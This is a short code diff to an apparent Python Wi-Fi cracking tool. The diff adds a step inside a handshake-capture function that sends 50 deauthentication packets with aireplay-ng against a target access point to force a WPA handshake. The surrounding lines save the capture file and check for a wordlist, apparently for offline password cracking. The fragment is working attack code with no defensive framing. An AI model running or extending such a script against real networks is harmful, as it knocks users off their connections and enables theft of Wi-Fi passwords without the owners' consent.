@@ -96,10 +96,15 @@ def get_handshake(mon_card, bssid, channel):
         else:
             print("[*] No handshake captured yet. Retrying...")
 
+        # Send deauth packets periodically to force a handshake
+        print("[*] Sending deauth packets...")
+        subprocess.run(['aireplay-ng', '--deauth', '50', '-a', bssid, mon_card], stdout=subprocess.DEVNULL)
+
     proc.terminate()
     capfile = savefile + "-01.cap"
     print(f"[+] Handshake saved to {capfile}")
     return capfile
+
 
 def ensure_wordlist_exists(path):
     if os.path.isfile(path):
